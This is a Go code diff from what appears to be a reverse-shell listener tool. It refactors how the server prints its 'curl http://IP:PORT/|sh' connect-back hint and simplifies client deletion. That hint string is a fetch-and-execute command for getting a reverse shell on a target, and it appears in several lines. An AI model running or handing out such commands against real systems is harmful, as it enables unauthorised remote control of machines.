@@ -59,28 +59,27 @@ func (s *TCPServer) Run() {
 
 	// Add help information of RaaS
 	// eg: curl http://[IP]:[PORT]/ | sh
-	ifaces, err := net.Interfaces()
-	for _, i := range ifaces {
-		addrs, _ := i.Addrs()
-		for _, addr := range addrs {
-			// var ip net.IP
-			// log.Warn("\t`curl http://[%s:%d]/|sh`", addr.(type).IP, s.Port)
-			// ip = addr.(*net.IPNet).IP.To4();
-			// if ip != nil {
-			// 	log.Warn("\t`curl http://%s:%d/|sh`", ip, s.Port)
-			// 	continue
-			// }
-			switch v := addr.(type) {
-			case *net.IPNet:
-				// ipv4
-				if addr.(*net.IPNet).IP.To4() != nil {
-					log.Warn("\t`curl http://%s:%d/|sh`", v.IP, s.Port)
-					break
+	if net.ParseIP(s.Host).IsUnspecified() {
+		// s.Host is unspecified
+		// eg: "0.0.0.0", "[::]"
+		ifaces, _ := net.Interfaces()
+		for _, i := range ifaces {
+			addrs, _ := i.Addrs()
+			for _, addr := range addrs {
+				switch v := addr.(type) {
+				case *net.IPNet:
+					// ipv4
+					if addr.(*net.IPNet).IP.To4() != nil {
+						log.Warn("\t`curl http://%s:%d/|sh`", v.IP, s.Port)
+						break
+					}
+					// ipv6 is not used currently
+					// log.Warn("\t`curl http://[%s:%d]/|sh`", v.IP, s.Port)
 				}
-				// ipv6 is not used currently
-				// log.Warn("\t`curl http://[%s:%d]/|sh`", v.IP, s.Port)
 			}
 		}
+	} else {
+		log.Warn("\t`curl http://%s:%d/|sh`", s.Host, s.Port)
 	}
 
 	for {
@@ -277,12 +276,8 @@ func (s *TCPServer) AddTCPClient(client *TCPClient) {
 }
 
 func (s *TCPServer) DeleteTCPClient(client *TCPClient) {
-	for _, c := range s.Clients {
-		if c == client {
-			client.Close()
-			delete(s.Clients, client.Hash)
-		}
-	}
+	delete(s.Clients, client.Hash)
+	client.Close()
 }
 
 func (s *TCPServer) GetAllTCPClients() map[string](*TCPClient) {
